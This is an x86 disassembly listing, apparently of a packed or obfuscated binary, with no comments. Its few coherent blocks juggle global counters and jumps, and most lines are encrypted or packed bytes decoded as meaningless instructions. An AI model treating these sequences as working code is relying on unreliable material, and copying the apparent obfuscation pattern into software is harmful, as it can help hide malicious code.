  40a3d5:	cmp    esp,DWORD PTR [esi-0x3bcca03d]
  40a3db:	or     al,0xf3
  40a3dd:	mul    DWORD PTR [ebx-0x1cced04b]
  40a3e3:	loop   0x40a380
  40a3e5:	mov    edx,0x595e54a1
  40a3ea:	push   esp
  40a3eb:	add    eax,0x23e05362
  40a3f0:	jp     0x40a41b
  40a3f2:	pushf  
  40a3f3:	mov    dh,0x4e
  40a3f5:	cld    
  40a3f6:	addr16 js 0x40a3e2
  40a3f9:	(bad)  
  40a3fa:	clc    
  40a3fb:	outs   dx,DWORD PTR ds:[esi]
  40a3fc:	mov    dh,0x45
  40a3fe:	mov    cl,0x22
  40a400:	sub    eax,0xb1febc0e
  40a405:	lock sar BYTE PTR [ebx-0x512da0cb],cl
  40a40c:	sub    eax,0x33fc558b
  40a411:	rol    BYTE PTR [ecx+0x4336f315],1
  40a417:	add    BYTE PTR [edi],bl
  40a419:	aaa    
  40a41a:	inc    ebx
  40a41b:	add    BYTE PTR [ebx],al
  40a41d:	rol    edi,1
  40a41f:	add    eax,0x43372b
  40a424:	shr    BYTE PTR [eax+0x0],0x0
  40a428:	cmp    edi,edx
  40a42a:	jb     0x40d767
  40a430:	mov    edx,DWORD PTR [ebp-0x28]
  40a433:	mov    edi,DWORD PTR [ebp-0x4]
  40a436:	xor    edx,eax
  40a438:	xor    ebx,ebx
  40a43a:	add    ebx,DWORD PTR ds:0x433663
  40a440:	and    DWORD PTR ds:0x43375f,ebx
  40a446:	xor    edi,eax
  40a448:	movzx  ebx,WORD PTR ds:0x433757
  40a44f:	sbb    DWORD PTR ds:0x433667,ebx
  40a455:	add    edi,ecx
  40a457:	add    DWORD PTR ds:0x4336f3,0x6da
  40a461:	add    edx,ecx
  40a463:	and    DWORD PTR ds:0x4336a7,0x0
  40a46d:	jmp    0x40a47f
  40a472:	mov    ebx,DWORD PTR ds:0x4336a7
  40a478:	inc    ebx
  40a479:	mov    DWORD PTR ds:0x4336a7,ebx
  40a47f:	cmp    DWORD PTR ds:0x4336a7,0x1c
  40a486:	jae    0x40a823
  40a48c:	cmp    DWORD PTR ds:0x4336a7,0x1e
  40a493:	jne    0x40a4a1
  40a499:	push   0x1
  40a49b:	call   DWORD PTR ds:0x412270
  40a4a1:	jmp    0x40a472
  40a4a6:	sbb    DWORD PTR ds:0x43376f,0x1f9a
  40a4b0:	jmp    0x40a823
  40a4b5:	shl    BYTE PTR [edi-0x482074c],cl
  40a4bb:	bnd jno 0x40a491
  40a4be:	lahf   
  40a4bf:	inc    edi
  40a4c0:	sbb    edx,esi
  40a4c2:	dec    ebx
  40a4c3:	mov    DWORD PTR [ecx+ecx*4-0x35838309],eax
  40a4ca:	jns    0x40a548
  40a4cc:	jl     0x40a546
  40a4ce:	mov    al,al
  40a4d0:	(bad)  
  40a4d1:	out    dx,eax
  40a4d2:	dec    ecx
  40a4d3:	cmc    
  40a4d4:	out    0x19,al
  40a4d6:	mov    ah,BYTE PTR [edx-0x3]
  40a4d9:	xor    DWORD PTR [ebp-0xc841221],edx
  40a4df:	ret    0x379c
  40a4e2:	adc    eax,0x2ae36e60
  40a4e7:	clc    
  40a4e8:	dec    eax
  40a4e9:	cmp    DWORD PTR [esi-0x6086c062],esp
  40a4ef:	adc    bh,cl
  40a4f1:	mov    BYTE PTR [eax],dl
  40a4f3:	sub    eax,DWORD PTR [ecx-0x3fe95ef1]
  40a4f9:	mov    DWORD PTR [eax-0x66],0xdc1c67ac
  40a500:	sub    eax,0x1719ba81
  40a505:	xlat   BYTE PTR ds:[ebx]
  40a506:	repnz mov ds:0x6cdbadc5,eax
  40a50c:	xchg   esi,eax
  40a50d:	repnz lods eax,DWORD PTR ds:[esi]
  40a50f:	mov    DWORD PTR [ebx],esi
  40a511:	(bad)  
  40a513:	ins    BYTE PTR es:[edi],dx
  40a514:	in     al,0x87
  40a516:	aaa    
  40a517:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a518:	test   al,0x53
  40a51a:	mov    al,ds:0x71d6c10e
  40a51f:	les    esp,FWORD PTR [ebx+0x28]
  40a522:	in     eax,0xb
  40a524:	enter  0xb30a,0x64
  40a528:	fwait
  40a529:	cmp    al,0xfc
  40a52b:	xor    DWORD PTR [esi-0xaf08d58],eax
  40a531:	jno    0x40a56d
  40a533:	and    ecx,DWORD PTR ds:[edi-0x17]
  40a537:	cmp    dh,ch
  40a539:	sbb    al,0xb0
  40a53b:	xchg   edx,eax
  40a53c:	ror    BYTE PTR [edi-0x393b0f0],1
  40a542:	push   eax
  40a543:	and    eax,0x41c3f261
  40a548:	aaa    
  40a549:	mov    bh,0xc7
  40a54b:	sub    cl,0x1d
  40a54e:	mov    ds:0x486bfc37,eax
  40a553:	pop    ebp
  40a554:	lds    ecx,FWORD PTR [edi]
  40a556:	not    bh
  40a558:	out    0xad,al
  40a55a:	(bad)  
  40a55c:	(bad)  
  40a55d:	(bad)  
  40a55e:	jmp    DWORD PTR es:[ebp+0x38]
  40a562:	sbb    al,0xb6
  40a564:	mov    edi,0xb40766e0
  40a569:	pop    es
  40a56a:	dec    ecx
  40a56b:	mov    dl,0x31
  40a56d:	jns    0x40a58a
  40a56f:	cld    
  40a570:	imul   ebx,ebp,0x6f
  40a573:	pop    edx
  40a574:	loop   0x40a527
  40a576:	and    ebx,DWORD PTR [esi+ebx*2+0x30]
  40a57a:	inc    edi
  40a57b:	paddb  mm4,QWORD PTR [eax]
  40a57e:	or     eax,0x31c9281f
  40a583:	scas   eax,DWORD PTR es:[edi]
  40a584:	mov    eax,0x97e8e3bd
  40a589:	jmp    0x40a607
  40a58b:	retf   
  40a58c:	ficom  DWORD PTR [ecx]
  40a58e:	out    0x7e,al
  40a590:	out    dx,al
  40a591:	pop    esi
  40a592:	or     DWORD PTR [ebx+esi*2+0xa3b526c],edx
  40a599:	or     al,0x44
  40a59b:	(bad)  
  40a59d:	mov    al,BYTE PTR [ecx]
  40a59f:	retf   0x88bd
  40a5a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a5a3:	inc    edx
  40a5a4:	ins    DWORD PTR es:[edi],dx
  40a5a5:	push   esi
  40a5a6:	(bad)  
  40a5a8:	mov    bh,0x5
  40a5aa:	push   eax
  40a5ab:	ret    
  40a5ac:	adc    ebp,DWORD PTR [edi+0x6a0804a4]
  40a5b2:	ins    BYTE PTR es:[edi],dx
  40a5b3:	sbb    bh,ah
  40a5b5:	sbb    ecx,DWORD PTR [esi]
  40a5b7:	mov    fs,WORD PTR [edx-0x70]
  40a5ba:	repnz mov ah,0x30
  40a5bd:	sbb    al,0x16
  40a5bf:	addr16 mov ecx,0x683eef16
  40a5c5:	es fxch st(5)
  40a5c8:	push   es
  40a5c9:	out    dx,al
  40a5ca:	pop    ds
  40a5cb:	pop    esp
  40a5cc:	and    al,0x94
  40a5ce:	pop    esp
  40a5cf:	mov    DWORD PTR [ecx+0x3269db50],esi
  40a5d5:	lods   eax,DWORD PTR ds:[esi]
  40a5d6:	es (bad) 
  40a5d8:	out    dx,eax
  40a5d9:	cmp    ebp,ecx
  40a5db:	aam    0x8d
  40a5dd:	inc    ebp
  40a5de:	push   edx
  40a5df:	mov    ebp,0xe0096518
  40a5e4:	aaa    
  40a5e5:	pop    eax
  40a5e6:	rcl    BYTE PTR [ebx+0x7e3a50c1],1
  40a5ec:	push   0xffffff9e
  40a5ee:	mov    ebp,0x2f83495f
  40a5f3:	(bad)  
  40a5f4:	pushf  
  40a5f5:	(bad)  
  40a5f6:	push   ss
  40a5f7:	in     eax,0xd8
  40a5f9:	ins    BYTE PTR es:[edi],dx
  40a5fa:	ffreep st(1)
  40a5fc:	and    ebp,eax
  40a5fe:	jge    0x40a669
  40a600:	sub    eax,0xa3ac50a9
  40a605:	das    
  40a606:	mov    edi,0xe2265225
  40a60b:	ins    BYTE PTR es:[edi],dx
  40a60c:	push   si
  40a60e:	jae    0x40a5a7
  40a610:	repnz retf 0xfc28
  40a614:	jp     0x40a660
  40a616:	scas   eax,DWORD PTR es:[edi]
  40a617:	adc    eax,0xe1b1541c
  40a61c:	jge    0x40a678
  40a61e:	inc    ecx
  40a61f:	or     dh,BYTE PTR [ebp+0x3b3ffbd9]
  40a625:	inc    esi
  40a626:	mov    bl,0xc8
  40a628:	iret   
  40a629:	cmp    ebp,DWORD PTR [edi+0x4a]
  40a62c:	ja     0x40a64f
  40a62e:	sub    eax,0x14e7e203
  40a633:	je     0x40a64e
  40a635:	scas   al,BYTE PTR es:[edi]
  40a636:	gs nop
  40a638:	mov    edx,0xa0803b38
  40a63d:	test   BYTE PTR [esi-0x7b],ah
  40a640:	xchg   esp,eax
  40a641:	adc    BYTE PTR [ebp-0x67],cl
  40a644:	adc    eax,0x23ba1e1a
  40a649:	shr    BYTE PTR [eax],1
  40a64b:	cdq    
  40a64c:	jle    0x40a616
  40a64e:	and    eax,0x2bad1ce7
  40a653:	out    dx,eax
  40a654:	ins    BYTE PTR es:[edi],dx
  40a655:	adc    eax,0xb5ba4167
  40a65a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a65b:	inc    esp
  40a65c:	ds cdq 
  40a65e:	jmp    0xc6d55f95
  40a663:	xor    eax,0x67d02c70
  40a668:	imul   edx,DWORD PTR [edi+0x9],0x22
  40a66c:	imul   eax,DWORD PTR [esp+esi*4-0x547628af],0x4d
  40a674:	adc    dh,BYTE PTR [ecx-0x73]
  40a677:	push   esi
  40a678:	lds    ebp,FWORD PTR [ecx-0x5aab4396]
  40a67e:	jne    0x40a671
  40a680:	sbb    DWORD PTR [ebx+0x3f],eax
  40a683:	(bad)  
  40a684:	xor    al,0xf1
  40a686:	and    esp,DWORD PTR [esi+ecx*2+0x3d]
  40a68a:	es xchg edi,eax
  40a68c:	enter  0xb24,0xaa
  40a690:	xor    ebx,DWORD PTR [esi-0x6a5308a0]
  40a696:	repz cmp ch,cl
  40a699:	xchg   ecx,eax
  40a69a:	out    0x24,eax
  40a69c:	push   edi
  40a69d:	leave  
  40a69e:	dec    ebp
  40a69f:	(bad)  
  40a6a1:	ds pop eax
  40a6a3:	mov    esp,ecx
  40a6a5:	mov    ?,WORD PTR [eax+0x3b]
  40a6a8:	(bad)  
  40a6a9:	loop   0x40a700
  40a6ab:	pop    ss
  40a6ac:	xchg   BYTE PTR ds:[esi],dl
  40a6af:	sub    BYTE PTR [edi],cl
  40a6b1:	stc    
  40a6b2:	adc    DWORD PTR [ecx+ebx*1],esi
  40a6b5:	in     al,0xda
  40a6b7:	fmul   QWORD PTR [ecx-0x7e54ebd]
  40a6bd:	and    al,0xc8
  40a6bf:	pop    edx
  40a6c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a6c1:	stos   BYTE PTR es:[edi],al
  40a6c2:	fbld   TBYTE PTR [ebp+0x72]
  40a6c5:	les    ecx,FWORD PTR [edi+0x4]
  40a6c8:	test   eax,0x2552fa1d
  40a6cd:	or     DWORD PTR [esi],ebp
  40a6cf:	ja     0x40a67a
  40a6d1:	mov    eax,ds:0xb6390fde
  40a6d6:	inc    ebx
  40a6d7:	leave  
  40a6d8:	mov    DWORD PTR [ecx+0xdc8bbea],0xc89778d3
  40a6e2:	cmp    eax,0xbebfdbb5
  40a6e7:	mov    dh,0x79
  40a6e9:	rcr    BYTE PTR [eax],cl
  40a6eb:	test   BYTE PTR [edx+0xf579e78],0x34
  40a6f2:	push   ss
  40a6f3:	jl     0x40a6eb
  40a6f5:	fistp  DWORD PTR [edx]
  40a6f7:	adc    BYTE PTR [ecx],ch
  40a6f9:	enter  0xbb6f,0xdf
  40a6fd:	and    al,0x9c
  40a6ff:	in     eax,0x5a
  40a701:	iret   
  40a702:	xor    BYTE PTR [edi-0x2ea2fc7a],dl
  40a708:	(bad)  
  40a709:	mov    dl,0x8f
  40a70b:	sub    dh,BYTE PTR [ebp+0xf]
  40a70e:	sti    
  40a70f:	sbb    ebp,edi
  40a711:	fnstcw WORD PTR [ebx+0x47]
  40a714:	mov    cl,0x17
  40a716:	add    eax,DWORD PTR [esi+eax*8+0x6f92ca89]
  40a71d:	mov    ah,0x24
  40a71f:	or     ch,bl
  40a721:	jmp    0x7d7fed9d
  40a726:	xchg   esp,eax
  40a727:	icebp  
  40a728:	mov    dh,0x2
  40a72a:	ficom  WORD PTR [ebp+0x11]
  40a72d:	push   edx
  40a72e:	push   es
  40a72f:	arpl   si,bx
  40a731:	(bad)  
  40a732:	mov    dl,0x19
  40a734:	add    esp,eax
  40a736:	mov    dh,0xb2
  40a738:	mov    ecx,0xe3e38389
  40a73d:	ror    DWORD PTR [edi+0x6e811a2],1
  40a743:	fimul  WORD PTR [ebx-0x415865d3]
  40a749:	pop    edx
  40a74a:	and    BYTE PTR [esi-0x67],ah
  40a74d:	cmp    ecx,DWORD PTR [ecx+0x670ad6a2]
  40a753:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a754:	sbb    bl,BYTE PTR [ecx+esi*1+0x16]
  40a758:	add    DWORD PTR [esi],ecx
  40a75a:	pop    ebp
  40a75b:	mov    ebx,0x44a7519a
  40a760:	jp     0x40a7b0
  40a762:	xchg   esi,eax
  40a763:	push   edx
  40a764:	fs pushf 
  40a766:	xor    al,0xf0
  40a768:	fcmovnb st,st(0)
  40a76a:	loopne 0x40a74c
  40a76c:	pop    ebx
  40a76d:	push   eax
  40a76e:	stos   BYTE PTR es:[edi],al
  40a76f:	xchg   ebx,eax
  40a770:	cmp    al,0x1f
  40a772:	jecxz  0x40a7bc
  40a774:	fidivr DWORD PTR [edi+0x40]
  40a777:	mov    cl,cl
  40a779:	cmc    
  40a77a:	sbb    BYTE PTR [edi+0x6b733fa3],al
  40a780:	test   DWORD PTR [ebp-0x3d909a09],eax
  40a786:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a787:	dec    eax
  40a788:	(bad)  
  40a789:	aas    
  40a78a:	ins    BYTE PTR es:[edi],dx
  40a78b:	call   0xd74b:0xfd885419
  40a792:	in     eax,dx
  40a793:	cdq    
  40a794:	sar    ah,cl
  40a796:	mov    ch,0x1e
  40a798:	adc    al,0x79
  40a79a:	outs   dx,DWORD PTR ds:[esi]
  40a79b:	sar    DWORD PTR [edi-0x35],cl
  40a79e:	jl     0x40a74b
  40a7a0:	pop    esp
  40a7a1:	leave  
  40a7a2:	sahf   
  40a7a3:	fisttp DWORD PTR [ebp-0x7b]
  40a7a6:	dec    esi
  40a7a7:	out    0xb5,eax
  40a7a9:	std    
  40a7aa:	std    
  40a7ab:	and    DWORD PTR ds:0x44924bad,esi
  40a7b1:	sbb    dl,BYTE PTR [ebx+0x1a]
  40a7b4:	and    ebp,esp
  40a7b6:	mov    edi,ecx
  40a7b8:	popa   
  40a7b9:	call   0xbf3eb484
  40a7be:	loop   0x40a74a
  40a7c0:	stos   DWORD PTR es:[edi],eax
  40a7c1:	sub    DWORD PTR [edx-0x68],esi
  40a7c4:	ds ins DWORD PTR es:[edi],dx
  40a7c6:	inc    edx
  40a7c7:	add    dh,BYTE PTR [ebx+eax*4]
  40a7ca:	test   DWORD PTR [ebp+0x59],esi
  40a7cd:	xchg   esp,eax
  40a7ce:	adc    BYTE PTR [ebp-0x46],cl
  40a7d1:	mov    ?,WORD PTR [ebx+0x35ad2a7f]
  40a7d7:	pop    esi
  40a7d8:	push   edi
  40a7d9:	shl    DWORD PTR [esi+0x6eb6e95d],1
  40a7df:	sub    al,0xdb
  40a7e1:	cwde   
  40a7e2:	cmc    
  40a7e3:	sbb    DWORD PTR [esi+eax*8+0x75],ecx
  40a7e7:	(bad)  
  40a7e8:	or     BYTE PTR [edi+0x16],bl
  40a7eb:	hlt    
  40a7ec:	scas   al,BYTE PTR es:[edi]
  40a7ed:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a7ef:	(bad)  [ecx]
  40a7f1:	(bad)  
  40a7f2:	and    DWORD PTR [edx],esi
  40a7f4:	sti    
  40a7f5:	jbe    0x40a823
  40a7f7:	push   eax
  40a7f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a7f9:	es mov edi,0x8edb1add
  40a7ff:	out    0x89,eax
  40a801:	jb     0x40a835
  40a803:	cdq    
  40a804:	dec    ebp
  40a805:	sbb    BYTE PTR [ecx-0x7c24a92],bl
  40a80b:	hlt    
  40a80c:	mov    ah,0xd2
  40a80e:	mov    dl,0xdb
  40a810:	push   esi
  40a811:	cmp    BYTE PTR [esi-0x74d2aceb],ah
  40a817:	fdivp  st(2),st
  40a819:	aaa    
  40a81a:	jb     0x40a7a2
  40a81c:	sbb    ecx,DWORD PTR [eax+0x5fa376a5]
  40a822:	dec    ecx
  40a823:	imul   edx,edi
  40a826:	adc    DWORD PTR ds:0x4336af,ebx
  40a82c:	mov    edi,DWORD PTR [ebp-0x8]
  40a82f:	or     DWORD PTR ds:0x4336ab,ecx
  40a835:	mov    ebx,DWORD PTR [ebp-0x10]
  40a838:	sub    ebx,edi
  40a83a:	cmp    ebx,edx
  40a83c:	mov    DWORD PTR ds:0x4336ef,0x652d
  40a846:	ja     0x40a872
  40a84c:	xor    edx,DWORD PTR ds:0x433697
  40a852:	mov    edx,DWORD PTR [ebp-0x4]
  40a855:	sbb    DWORD PTR ds:0x4336df,0x855
  40a85f:	xor    edx,eax
  40a861:	add    edx,ecx
  40a863:	mov    DWORD PTR ds:0x4336af,0x65c5
  40a86d:	jmp    0x40bab5
  40a872:	mov    ebx,DWORD PTR ds:0x433723
  40a878:	sub    ebx,DWORD PTR ds:0x43364f
  40a87e:	mov    DWORD PTR ds:0x433723,ebx
  40a884:	mov    edx,DWORD PTR [ebp-0x2c]
  40a887:	mov    edi,DWORD PTR [ebp-0x4]
  40a88a:	or     DWORD PTR ds:0x433697,ebx
  40a890:	xor    edx,eax
  40a892:	xor    edi,eax
  40a894:	movzx  ebx,BYTE PTR ds:0x433717
  40a89b:	adc    DWORD PTR ds:0x433653,ebx
  40a8a1:	add    edi,ecx
  40a8a3:	add    edx,ecx
  40a8a5:	imul   edx,edi
  40a8a8:	adc    DWORD PTR ds:0x4336a7,edi
  40a8ae:	mov    edi,DWORD PTR [ebp-0x8]
  40a8b1:	mov    ebx,DWORD PTR [ebp-0x10]
  40a8b4:	sub    ebx,edi
  40a8b6:	cmp    ebx,edx
  40a8b8:	ja     0x40a8c6
  40a8be:	mov    edx,DWORD PTR [ebp-0x28]
  40a8c1:	jmp    0x40baa7
  40a8c6:	mov    edx,DWORD PTR [ebp-0x30]
  40a8c9:	mov    edi,DWORD PTR [ebp-0x4]
  40a8cc:	xor    edx,eax
  40a8ce:	xor    edi,eax
  40a8d0:	jmp    0x40ac43
  40a8d5:	call   0x73960c99
  40a8da:	jge    0x40a8ce
  40a8dc:	pop    ecx
  40a8dd:	jno    0x40a8ff
  40a8df:	aad    0xd1
  40a8e1:	inc    edx
  40a8e2:	jge    0x40a8c5
  40a8e4:	push   ds
  40a8e5:	addr16 lock jl 0x40a965
  40a8e9:	retf   0x7c79
  40a8ec:	jl     0x40a913
  40a8ee:	dec    esi
  40a8ef:	add    eax,0x21d1851b
  40a8f4:	(bad)  
  40a8f7:	and    al,0xa
  40a8f9:	jo     0x40a899
  40a8fb:	sub    esp,DWORD PTR [eax+0x68]
  40a8fe:	es ret 
  40a900:	mov    esp,0x79456e76
  40a905:	push   esi
  40a906:	adc    eax,0xa85b6daa
  40a90b:	icebp  
  40a90c:	mov    edi,DWORD PTR [eax+ebp*4+0x1572c538]
  40a913:	mov    eax,0x24a837b7
  40a918:	les    edi,FWORD PTR [edx+0x6d]
  40a91b:	sub    ch,BYTE PTR [edx-0x2a]
  40a91e:	mov    ds:0x15e1abde,eax
  40a923:	inc    ecx
  40a924:	mov    bl,ah
  40a926:	add    DWORD PTR [ebp+0x3d62a007],ebp
  40a92c:	dec    esp
  40a92d:	pop    edi
  40a92e:	mov    edx,0xb78897c6
  40a933:	arpl   WORD PTR [ecx],bp
  40a935:	adc    BYTE PTR [edx],ch
  40a937:	xor    ax,0x66d2
  40a93b:	in     al,0x92
  40a93d:	and    al,0x22
  40a93f:	pop    esi
  40a940:	cmp    eax,DWORD PTR [edi]
  40a942:	call   0xb6c36af7
  40a947:	(bad)  
  40a948:	push   ds
  40a949:	icebp  
  40a94a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a94b:	out    0xd0,eax
  40a94d:	jp     0x40a9cb
  40a94f:	mov    dl,0x49
  40a951:	lock sbb eax,0x8318e36e
  40a957:	imul   ecx,edx,0x7c
  40a95a:	sbb    eax,0x2de3272c
  40a95f:	popf   
  40a960:	dec    ebp
  40a961:	push   ss
  40a962:	pop    ds
  40a963:	fisttp QWORD PTR [eax+esi*8-0x35]
  40a967:	into   
  40a968:	into   
  40a969:	inc    esp
  40a96a:	mov    edi,0xe282bd32
  40a96f:	div    DWORD PTR [edi]
  40a971:	or     bl,ch
  40a973:	pop    es
  40a974:	adc    dh,dl
  40a976:	shl    BYTE PTR [edx+0x3b],0x60
  40a97a:	adc    DWORD PTR es:[edi+0x14],esp
  40a97e:	pop    ebx
  40a97f:	je     0x40a9d8
  40a981:	sahf   
  40a982:	add    al,ah
  40a984:	jle    0x40a9d8
  40a986:	pavgw  mm3,mm3
  40a989:	fst    st(5)
  40a98b:	les    edi,FWORD PTR [edx+edx*8-0x2f]
  40a98f:	adc    BYTE PTR [esp+edx*1+0x5090b965],cl
  40a996:	sbb    DWORD PTR [eax+0x46b33504],esi
  40a99c:	push   esp
  40a99d:	jmp    DWORD PTR [esi+eax*4]
  40a9a0:	(bad)  
  40a9a2:	push   DWORD PTR [ebx-0xe3e3575]
  40a9a8:	mov    dl,0x86
  40a9aa:	lods   eax,DWORD PTR ds:[esi]
  40a9ab:	mov    eax,ds:0x9ee888c1
  40a9b0:	inc    ebp
  40a9b1:	jge    0x40a9b9
  40a9b3:	add    BYTE PTR [edx],0xbe
  40a9b6:	mov    ds:0x83413fb0,eax
  40a9bb:	push   DWORD PTR [esi-0x1af7b4ea]
  40a9c1:	(bad)  [eax]
  40a9c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9c4:	(bad)  
  40a9c6:	iret   
  40a9c7:	jp     0x40a97d
  40a9c9:	pop    edi
  40a9ca:	sub    eax,0xa1f4449a
  40a9cf:	popa   
  40a9d0:	(bad)  
  40a9d2:	ffreep st(7)
  40a9d4:	dec    edi
  40a9d5:	lahf   
  40a9d6:	inc    esi
  40a9d7:	lock xchg esp,eax
  40a9d9:	xor    al,0x5b
  40a9db:	lds    esp,FWORD PTR [ebx+0x55]
  40a9de:	mov    WORD PTR [ecx+0x7f],ss
  40a9e1:	add    esi,esp
  40a9e3:	call   0xc6fa:0xf75fba70
  40a9ea:	adc    eax,0x5501b1be
  40a9ef:	lods   eax,DWORD PTR ds:[esi]
  40a9f0:	repz std 
  40a9f2:	mov    edi,0xfcfaf1d
  40a9f7:	jecxz  0x40a98b
  40a9f9:	leave  
  40a9fa:	stc    
  40a9fb:	test   BYTE PTR [ebp-0x46b5edb8],ch
  40aa01:	arpl   WORD PTR [edi],cx
  40aa03:	mov    BYTE PTR [ebx-0x4cd11c98],dh
  40aa09:	push   ss
  40aa0a:	add    ch,dl
  40aa0c:	xor    ch,cl
  40aa0e:	jbe    0x40aa5d
  40aa10:	packuswb mm0,mm3
  40aa13:	enter  0x91f1,0xa2
  40aa17:	je     0x40a9e8
  40aa19:	popf   
  40aa1a:	xchg   ebx,eax
  40aa1b:	cmp    al,0x4b
  40aa1d:	mov    cl,0xaf
  40aa1f:	xor    ebx,DWORD PTR [edi+0x67]
  40aa22:	xchg   ecx,eax
  40aa23:	add    eax,0xd41623f9
  40aa28:	add    BYTE PTR [eax+edi*4+0x36],cl
  40aa2c:	fidiv  DWORD PTR [edx]
  40aa2e:	inc    esp
  40aa2f:	inc    edi
  40aa30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa31:	push   eax
  40aa32:	lea    edi,[esi]
  40aa34:	xchg   esi,eax
  40aa35:	pop    es
  40aa36:	mov    dl,0x38
  40aa38:	push   ebp
  40aa39:	cdq    
  40aa3a:	inc    ecx
  40aa3b:	cmp    DWORD PTR [ebp+0x29ec20fe],ebp
  40aa41:	(bad)  
  40aa42:	cmp    BYTE PTR [edx],dh
  40aa44:	(bad)  
  40aa45:	nop
  40aa46:	and    al,0x65
  40aa48:	push   esp
  40aa49:	inc    eax
  40aa4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa4b:	adc    al,BYTE PTR [ebp+0xb]
  40aa4e:	mov    DWORD PTR [edx+esi*4],edx
  40aa51:	pushf  
  40aa52:	je     0x40aa96
  40aa54:	xor    DWORD PTR [esi],ebx
  40aa56:	pop    eax
  40aa57:	(bad)  
  40aa58:	add    DWORD PTR [edx-0x1],0xb
  40aa5c:	xor    dl,BYTE PTR ds:0x78cf1bf0
  40aa62:	retf   
  40aa63:	sub    ch,ch
  40aa65:	jbe    0x40aa0e
  40aa67:	imul   esp,DWORD PTR [edi],0xdd806292
  40aa6d:	(bad)  
  40aa6e:	lock xchg edi,eax
  40aa70:	xor    al,BYTE PTR [edx-0x4da5fe67]
  40aa76:	sub    DWORD PTR [edx],esp
  40aa78:	inc    edx
  40aa79:	out    0x25,eax
  40aa7b:	out    0xd1,al
  40aa7d:	sti    
  40aa7e:	dec    edx
  40aa7f:	cwde   
  40aa80:	test   BYTE PTR [ebx-0x56],bh
  40aa83:	adc    edx,DWORD PTR [ebx+0xc]
  40aa86:	gs mov ecx,0xef8f0803
  40aa8c:	jmp    0x7959a4f5
  40aa91:	fadd   DWORD PTR [ebp-0x4a]
  40aa94:	push   ecx
  40aa95:	inc    esi
  40aa96:	test   eax,0x5831309b
  40aa9b:	xchg   esi,eax
  40aa9c:	std    
  40aa9d:	sbb    BYTE PTR ds:0xfbf1daf1,0xbc
  40aaa4:	inc    eax
  40aaa5:	ins    BYTE PTR es:[edi],dx
  40aaa6:	fdivr  st(4),st
  40aaa8:	fcmovne st,st(4)
  40aaaa:	fnsave [ebx+ebx*8]
  40aaad:	pop    ebp
  40aaae:	clc    
  40aaaf:	mov    bh,0xb2
  40aab1:	push   ebx
  40aab2:	nop
  40aab3:	(bad)
  40aab6:	iret   
  40aab7:	fidiv  DWORD PTR [esi+0x62]
  40aaba:	stc    
  40aabb:	sub    DWORD PTR [ecx],ebx
  40aabd:	fistp  QWORD PTR [edx]
  40aabf:	add    ebp,DWORD PTR [ecx+0x24763d04]
  40aac5:	dec    eax
  40aac6:	xor    BYTE PTR [edi-0x23910f8e],0x97
  40aacd:	pushf  
  40aace:	in     eax,dx
  40aacf:	dec    ebp
  40aad0:	mov    ecx,0x3435751b
  40aad5:	call   0xb5f0:0x7f2c9102
  40aadc:	push   es
  40aadd:	pop    edi
  40aade:	push   ecx
  40aadf:	mov    ds:0xcd6d912a,eax
  40aae4:	ror    BYTE PTR [ecx+0x71],cl
  40aae7:	xchg   edx,eax
  40aae8:	sub    eax,0x77095cd3
  40aaed:	fild   QWORD PTR [esi]
  40aaef:	aam    0xf9
  40aaf1:	lea    esp,[esi]
  40aaf3:	popa   
  40aaf4:	shl    BYTE PTR [eax],cl
  40aaf6:	sub    eax,0xdd3d281
  40aafb:	adc    ebx,ecx
  40aafd:	xchg   esi,eax
  40aafe:	push   ebp
  40aaff:	push   ebp
  40ab00:	imul   esp,DWORD PTR [esi+edi*4+0x1dfcd25f],0x6061a5c8
  40ab0b:	test   eax,0xc51fd24
  40ab10:	clc    
  40ab11:	and    DWORD PTR [esi],edi
  40ab13:	inc    esi
  40ab14:	xor    ebp,ebp
  40ab16:	jmp    0x40aac2
  40ab18:	and    BYTE PTR [eax+0x28],dh
  40ab1b:	mov    eax,ds:0x89fcabed
  40ab20:	cmp    eax,0x29187e63
  40ab25:	cdq    
  40ab26:	test   al,0x2
  40ab28:	mov    al,ds:0x9a874925
  40ab2d:	push   cs
  40ab2e:	and    eax,0xefe29a04
  40ab33:	inc    ebx
  40ab34:	retf   0x6395
  40ab37:	mov    ecx,0x95bfd668
  40ab3c:	pop    edx
  40ab3d:	les    ebp,FWORD PTR [edi]
  40ab3f:	sub    DWORD PTR [ebx-0x25],esp
  40ab42:	dec    ebx
  40ab43:	dec    ebx
  40ab44:	or     DWORD PTR [ebx+0x4f],0x9b796d49
  40ab4b:	sbb    al,0x40
  40ab4d:	pop    ds
  40ab4e:	mov    BYTE PTR [ebp-0x68],al
  40ab51:	loope  0x40aafa
  40ab53:	aaa    
  40ab54:	xlat   BYTE PTR ds:[ebx]
  40ab55:	sub    eax,0x74285517
  40ab5a:	add    eax,0x32f83f61
  40ab5f:	test   DWORD PTR [ebx+0x54],ecx
  40ab62:	lock cmp eax,0x742a1124
  40ab68:	dec    eax
  40ab69:	or     al,0xd5
  40ab6b:	popf   
  40ab6c:	add    bl,BYTE PTR [edi+0x33]
  40ab6f:	mov    edx,0xe06f4dee
  40ab74:	pop    eax
  40ab75:	fdivr  DWORD PTR [esi-0x63]
  40ab78:	int    0x3b
  40ab7a:	push   eax
  40ab7b:	inc    edi
  40ab7c:	aaa    
  40ab7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab7e:	mov    ch,0xcc
  40ab80:	int    0x6c
  40ab82:	mov    al,BYTE PTR [eax-0x6d]
  40ab85:	jmp    0x40ab97
  40ab87:	sub    eax,0x5d6ff0e8
  40ab8c:	enter  0x383,0xad
  40ab90:	ror    DWORD PTR [edx+0x33],cl
  40ab93:	pop    ebp
  40ab94:	push   ebx
  40ab95:	mov    dl,0x2d
  40ab97:	jecxz  0x40abce
  40ab99:	dec    edi
  40ab9a:	popa   
